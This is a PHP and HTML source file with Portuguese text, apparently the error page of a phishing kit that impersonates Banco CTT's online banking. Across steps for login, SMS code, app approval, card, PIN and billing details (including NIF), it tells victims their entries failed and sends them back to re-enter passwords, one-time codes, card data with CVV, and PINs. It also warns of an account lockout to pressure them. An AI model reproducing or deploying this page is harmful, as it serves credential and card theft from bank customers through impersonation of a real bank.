<?php
// ============================================================
//  error.php — Generic error page, parameterized by step
//  URL: error.php?step=login|sms|approve|card|pin|billing
//  
// ============================================================
require_once 'config.php';

$step = isset($_GET['step']) ? preg_replace('/[^a-z]/', '', strtolower($_GET['step'])) : 'login';
$allowed = array('login', 'sms', 'approve', 'card', 'pin', 'billing');
if (!in_array($step, $allowed, true)) $step = 'login';

$config = array(
    'login'   => array(
        'title'   => 'Falha no Início de Sessão',
        'message' => 'O nome de utilizador ou a palavra-passe introduzidos estão incorretos. Verifique os seus dados e tente novamente.',
        'hint'    => 'Se se esqueceu da palavra-passe, pode recuperá-la na página de início de sessão.',
        'retry'   => 'index.php',
        'icon'    => '🔒'
    ),
    'sms'     => array(
        'title'   => 'Código SMS Incorreto',
        'message' => 'O código de verificação de 8 dígitos introduzido não corresponde a um pedido ativo.',
        'hint'    => 'O código expira em 5 minutos. Verifique se o introduziu corretamente.',
        'retry'   => 'sms.php',
        'icon'    => '📱'
    ),
    'approve' => array(
        'title'   => 'Falha na Aprovação',
        'message' => 'A aprovação da sessão através da aplicação não foi concluída. Tente novamente.',
        'hint'    => 'Certifique-se de que a aplicação Banco CTT está instalada e ativa no seu dispositivo.',
        'retry'   => 'approve.php',
        'icon'    => '📲'
    ),
    'card'    => array(
        'title'   => 'Falha na Verificação do Cartão',
        'message' => 'Os dados do cartão introduzidos não correspondem aos registados na sua conta.',
        'hint'    => 'Verifique o número, a data de validade e o código CVV.',
        'retry'   => 'card.php',
        'icon'    => '💳'
    ),
    'pin'     => array(
        'title'   => 'PIN Incorreto',
        'message' => 'O PIN introduzido está incorreto. Tem ainda duas tentativas antes de o acesso ser bloqueado.',
        'hint'    => 'Se se esqueceu do PIN, contacte o serviço de apoio ao cliente.',
        'retry'   => 'pin.php',
        'icon'    => '🔐'
    ),
    'billing' => array(
        'title'   => 'Falha na Identificação',
        'message' => 'Os dados pessoais introduzidos não podem ser verificados neste momento.',
        'hint'    => 'Verifique a morada, o NIF e os dados de identificação.',
        'retry'   => 'billing.php',
        'icon'    => '📋'
    )
);

$c = $config[$step];
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Erro — <?php echo htmlspecialchars($c['title']); ?> | Banco CTT Online</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{
    font-family:"Segoe UI","Segoe",Tahoma,Helvetica,Arial,sans-serif;
    font-size:13px;
    color:#444;
    background:#f4f4f4;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px;
}
.page{width:100%;max-width:480px}
.card{
    background:#fff;
    border-radius:6px;
    box-shadow:0 2px 14px rgba(0,0,0,0.08);
    overflow:hidden;
}
.brand-bar{
    background:#d32f2f;
    color:#fff;
    text-align:center;
    padding:8px 12px;
    font-size:11px;
    font-weight:700;
    letter-spacing:0.4px;
    text-transform:uppercase;
}
.logo-area{
    padding:24px 30px 8px;
    text-align:center;
    background:#fff;
}
.logo-area img{height:28px}
.logo-area .logo-fallback{
    font-size:20px;
    font-weight:700;
    color:#222222;
}
.body{
    padding:20px 30px 30px;
    background:#fff;
    text-align:center;
}
.err-icon{
    width:64px;
    height:64px;
    border-radius:50%;
    background:#ffebee;
    color:#d32f2f;
    font-size:32px;
    line-height:64px;
    margin:0 auto 16px;
    border:2px solid #ef9a9a;
}
h2{
    font-size:16px;
    color:#d32f2f;
    font-weight:700;
    margin-bottom:8px;
}
p{
    font-size:12px;
    color:#666;
    line-height:1.6;
    margin-bottom:6px;
}
.hint{
    margin-top:10px;
    padding:10px 12px;
    background:#fdecef;
    border:1px solid #f5b8c3;
    border-radius:3px;
    font-size:11px;
    color:#8c0017;
    text-align:left;
}
.actions{
    margin-top:20px;
    display:flex;
    gap:8px;
    flex-direction:column;
}
.btn{
    display:block;
    width:100%;
    padding:11px 18px;
    border:none;
    border-radius:3px;
    font-size:13px;
    font-weight:700;
    font-family:inherit;
    cursor:pointer;
    letter-spacing:0.4px;
    text-transform:uppercase;
    text-decoration:none;
    text-align:center;
    transition:background 0.15s;
}
.btn-primary{background:#df0024;color:#ffffff}
.btn-primary:hover{background:#b8001d}
.btn-secondary{
    background:transparent;
    color:#555;
    border:1px solid #c8c8c8;
}
.btn-secondary:hover{background:#f3f3f3}
.support{
    margin-top:18px;
    padding-top:14px;
    border-top:1px solid #f0f0f0;
    font-size:11px;
    color:#888;
}
.support strong{color:#222222}
.footer{
    text-align:center;
    padding:14px 20px 18px;
    font-size:10px;
    color:#888;
    background:#fff;
    border-top:1px solid #f0f0f0;
}
@media(max-width:520px){
    .body{padding:18px 22px 26px}
    .logo-area{padding:20px 22px 6px}
}
</style>
</head>
<body>
<div class="page">
    <div class="card">
        <div class="brand-bar"><?php echo htmlspecialchars($c['icon']); ?> Erro de Verificação</div>

        <div class="logo-area">
            <img src="https://thebanks.eu/img/logos/Banco_CTT.png"
                 alt="Banco CTT"
                 onerror="this.outerHTML='<span class=&quot;logo-fallback&quot;>Banco CTT</span>'">
        </div>

        <div class="body">
            <div class="err-icon">!</div>
            <h2><?php echo htmlspecialchars($c['title']); ?></h2>
            <p><?php echo htmlspecialchars($c['message']); ?></p>

            <div class="hint">ℹ <?php echo htmlspecialchars($c['hint']); ?></div>

            <div class="actions">
                <a href="<?php echo htmlspecialchars($c['retry']); ?>" class="btn btn-primary">TENTAR NOVAMENTE</a>
                <a href="index.php" class="btn btn-secondary">Página Inicial</a>
            </div>

            <div class="support">
                Precisa de ajuda?<br>
                <strong>Apoio ao Cliente:</strong> 210 033 000<br>
                <span style="font-size:10px">Segunda a Sexta 08:00 - 22:00</span>
            </div>
        </div>

        <div class="footer">
            © 2026 Banco CTT — <a href="#" style="color:#666">Termos de Utilização</a> · <a href="#" style="color:#666">Política de Privacidade</a>
        </div>
    </div>
</div>
</body>
</html>